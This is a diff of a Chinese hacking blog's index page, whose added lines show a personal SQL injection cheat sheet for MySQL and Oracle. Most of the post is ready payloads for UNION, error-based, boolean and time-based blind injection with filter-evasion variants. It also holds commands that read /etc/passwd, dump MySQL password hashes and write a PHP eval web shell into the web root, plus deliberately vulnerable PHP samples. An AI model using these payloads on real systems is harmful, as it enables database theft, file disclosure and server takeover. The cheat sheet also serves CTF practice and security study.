@@ -1,12 +1,1171 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="hark"><title>Bug'小虫 | 走过黑暗，前面便是光</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Bug'小虫</h1><a id="logo" href="/.">Bug'小虫</a><p class="description">走过黑暗，前面便是光</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title"><a href="/2019/05/05/关于本博客/">关于本博客</a></h1><div class="post-meta">2019-05-05</div><div class="post-content"><p>早就想搭建属于自己的博客了，一直没有腾出时间，Jekyll也觉得一般，前一阵一个朋友推荐hexo，看了看文档，很不错，也决定用hexo搭建一个自己的博客.<br>主要用于记一些笔记之类的，本地~在线都可以随时访问，这样方便多了。同时也基于共享精神，希望可以帮助 到一些朋友~</p>
-<figure class="highlight python"><figcaption><span>bash</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">asdfasd</span><br><span class="line">asdfcas</span><br><span class="line">asdcas</span><br></pre></td></tr></table></figure></div><p class="readmore"><a href="/2019/05/05/关于本博客/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/06/27/hello-world/">Hello World</a></h1><div class="post-meta">2018-06-27</div><div class="post-content"><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p></div><p class="readmore"><a href="/2018/06/27/hello-world/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/04/20/vim常用命令总结/">vim常用命令总结</a></h1><div class="post-meta">2018-04-20</div><div class="post-content"><p>为了方便查找，所以只介绍一些我自己经常用到的命令<br>在命令行中输入vim,进入vim编辑器<br>1,<b>i</b><br>按一下i键，下端显示–INSERT–<br></div><p class="readmore"><a href="/2018/04/20/vim常用命令总结/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/03/28/PHP手工注入笔记 /">PHP手工注入笔记</a></h1><div class="post-meta">2018-03-28</div><div class="post-content"><p> PHP手工注入笔记，整理了一下，自己觉得挺仔细的！</p>
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Bug&#39;小虫</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="小虫">
+    
+
+    
+    <meta name="description" content="hark">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bug&#39;小虫">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Bug&#39;小虫">
+<meta property="og:description" content="hark">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bug&#39;小虫">
+<meta name="twitter:description" content="hark">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
+				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main">
+
+   
+    
+    <article class="post-expand [layout]" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/06/07/SQL注入备忘手册/" title="SQL注入备忘手册" itemprop="url">SQL注入备忘手册</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-06-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2018-06-07</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>SQL备忘录，平时查阅用，随时更新。</p>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="常用信息及语句"><a href="#常用信息及语句" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前用户：user()</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名: database()</span><br><span class="line">操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>
+<p>所有用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(user) from mysql.user</span><br></pre></td></tr></table></figure></p>
+<p>用户hash：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(password) from mysql.user <span class="built_in">where</span> user=<span class="string">'root'</span></span><br></pre></td></tr></table></figure></p>
+<p>所有数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p>
+<p>表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'库名'</span></span><br><span class="line"></span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line">SELECT group_concat(table_name) from information_schema.table_constraints <span class="built_in">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure></p>
+<p>字段名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'表名'</span></span><br></pre></td></tr></table></figure></p>
+<p>读文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT load_file(<span class="string">'/etc/passwd'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>写文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt; into outfile <span class="string">'/var/www/html/shell.php'</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><h3 id="猜字段长度"><a href="#猜字段长度" class="headerlink" title="猜字段长度"></a>猜字段长度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by num</span><br><span class="line">Example：id=1 order by 2 页面正常，id=3 order by 6页面错误，那么字段就是2</span><br><span class="line">字符型的话需要注释后面的引号，Example：id=1<span class="string">' order by 2%23</span></span><br></pre></td></tr></table></figure>
+<h3 id="暴字段位置"><a href="#暴字段位置" class="headerlink" title="暴字段位置"></a>暴字段位置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 UNION SELECT 1,2或 id=-1 UNION SELECT 1,2</span><br></pre></td></tr></table></figure>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,password,3 from admin</span><br></pre></td></tr></table></figure>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法</span><br></pre></td></tr></table></figure>
+<h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure>
+<h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+<h3 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<h3 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
+<h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>
+<h3 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>
+<h2 id="BOOL盲注"><a href="#BOOL盲注" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</span><br></pre></td></tr></table></figure>
+<h3 id="构造布尔条件"><a href="#构造布尔条件" class="headerlink" title="构造布尔条件"></a>构造布尔条件</h3><p>现在很多CTF比赛脑洞都出在了bool条件的构造，花式bool条件构造。<br>正常情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'or bool#</span></span><br><span class="line"><span class="string">true'</span>and bool<span class="comment">#</span></span><br><span class="line">```    </span><br><span class="line">不使用空格、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'or(bool)='</span>1</span><br><span class="line"><span class="literal">true</span><span class="string">'and(bool)='</span>1</span><br><span class="line">```    </span><br><span class="line">不使用or、and、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'^!(bool)='</span>1</span><br><span class="line"><span class="string">'=(bool)='</span></span><br><span class="line"><span class="string">'||(bool)='</span>1</span><br><span class="line"><span class="literal">true</span><span class="string">'%26%26(bool)='</span>1</span><br><span class="line"><span class="string">'=if((bool),1,0)='</span>0</span><br><span class="line">```    </span><br><span class="line">不使用等号、空格、注释</span><br><span class="line">```bash</span><br><span class="line"><span class="string">'or(bool)&lt;&gt;'</span>0</span><br><span class="line"><span class="string">'or((bool)in(1))or'</span>0</span><br><span class="line"> ```   </span><br><span class="line">其他</span><br><span class="line">```bash</span><br><span class="line">or (<span class="keyword">case</span> when (bool) <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end)</span><br></pre></td></tr></table></figure></p>
+<p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' or (bool) or '</span>1<span class="string">'='</span>1</span><br><span class="line">1%<span class="string">' and (bool) or 1=1 and '</span>1<span class="string">'='</span>1</span><br></pre></td></tr></table></figure></p>
+<h3 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h3><p>逻辑判断基本就那些函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">left(user(),1)&gt;<span class="string">'r'</span>  </span><br><span class="line">right(user(),1)&gt;<span class="string">'r'</span>  </span><br><span class="line">substr(user(),1,1)=<span class="string">'r'</span>  </span><br><span class="line">mid(user(),1,1)=<span class="string">'r'</span> </span><br><span class="line">```    </span><br><span class="line">不使用逗号</span><br><span class="line">```bash </span><br><span class="line">user() regexp <span class="string">'^[a-z]'</span></span><br><span class="line">user() like <span class="string">'root%'</span></span><br><span class="line">POSITION(<span class="string">'root'</span> <span class="keyword">in</span> user())</span><br><span class="line">mid(user() from 1 <span class="keyword">for</span> 1)=<span class="string">'r'</span></span><br><span class="line">mid(user() from 1)=<span class="string">'r'</span></span><br><span class="line">ASCII()、ORD()和CHAR()函数一般用做辅助。</span><br></pre></td></tr></table></figure></p>
+<h3 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure>
+<p>2 rows in set (0.00 sec)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br></pre></td></tr></table></figure></p>
+<p>2 rows in set (0.01 sec)<br>这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。</p>
+<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</p>
+<h3 id="一般格式"><a href="#一般格式" class="headerlink" title="一般格式"></a>一般格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((bool),sleep(3),0)和or (<span class="keyword">case</span> when (bool) <span class="keyword">then</span> sleep(3) <span class="keyword">else</span> 0 end)</span><br></pre></td></tr></table></figure>
+<h3 id="两个函数："><a href="#两个函数：" class="headerlink" title="两个函数："></a>两个函数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(100000,MD5(1)) or sleep(5)</span><br></pre></td></tr></table></figure>
+<p>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p>
+<h2 id="MySQL注释符："><a href="#MySQL注释符：" class="headerlink" title="MySQL注释符："></a>MySQL注释符：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. -- -</span><br><span class="line">2. /* .... */</span><br><span class="line">3. <span class="comment">#</span></span><br><span class="line">4. `</span><br><span class="line">5. ;%00</span><br></pre></td></tr></table></figure>
+<p>1.7 Insert&amp;Update注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert和update一般使用报错注入</span><br><span class="line">如果没有错误回显，insert可以使用延时注入：</span><br><span class="line">update可以使用bool盲注和延时盲注。</span><br></pre></td></tr></table></figure></p>
+<h2 id="order-by后的注入"><a href="#order-by后的注入" class="headerlink" title="order by后的注入"></a>order by后的注入</h2><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF((bool),1,(select 1 union select 2))</span><br></pre></td></tr></table></figure>
+<h3 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF(1,sleep(3),0);</span><br></pre></td></tr></table></figure></p>
+<p>两条数据延时了6秒</p>
+<h2 id="表名可控注入"><a href="#表名可控注入" class="headerlink" title="表名可控注入"></a>表名可控注入</h2><h3 id="表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;<span class="variable">$table</span>&#125;`"</span>) or die(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from shop_&#123;<span class="variable">$table</span>&#125; where 1=1"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"<span class="variable">$sql</span>"</span>)));</span><br><span class="line"><span class="built_in">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+<p>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `shop_users` `<span class="built_in">where</span> updatexml(1,concat(0x5e24,(select user()),0x5e24),1)<span class="comment">#`</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc shop_&#123;<span class="variable">$table</span>&#125;"</span>) or die(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from `shop_&#123;<span class="variable">$table</span>&#125;` where 1=1"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"<span class="variable">$sql</span>"</span>)));</span><br><span class="line"><span class="built_in">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
+<h2 id="无列明注入"><a href="#无列明注入" class="headerlink" title="无列明注入"></a>无列明注入</h2><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 c union select * from flag)b) <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure>
+<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 as c union select * from flag) as b) <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>需要一个请求两个注入</p>
+<h2 id="可报错时爆表名、字段名、库名"><a href="#可报错时爆表名、字段名、库名" class="headerlink" title="可报错时爆表名、字段名、库名"></a>可报错时爆表名、字段名、库名</h2><h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin <span class="built_in">where</span> id=1 and (select * from (select * from admin as a join admin as b) as c)</span><br></pre></td></tr></table></figure></p>
+<p>把当前表第一个字段成功爆出来了。</p>
+<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
+<p>同时，可以利用using爆其他字段：</p>
+<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p>翻阅mysql的文档发现了一个非常好玩的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Polygon(ls1, ls2, ...)</span><br></pre></td></tr></table></figure></p>
+<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
+<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p>
+<h3 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h3><p>上面的方法已经可以爆出库名了，提供另一个方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin <span class="built_in">where</span> id =1<span class="_">-a</span>()</span><br></pre></td></tr></table></figure></p>
+<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><h2 id="常用信息及语句-1"><a href="#常用信息及语句-1" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>注释符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- +</span><br></pre></td></tr></table></figure></p>
+<p>当前用户权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from session_roles</span><br></pre></td></tr></table></figure></p>
+<p>当前数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select banner from sys.v_<span class="variable">$version</span> <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
+<p>服务器监听IP：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_address from dual</span><br></pre></td></tr></table></figure></p>
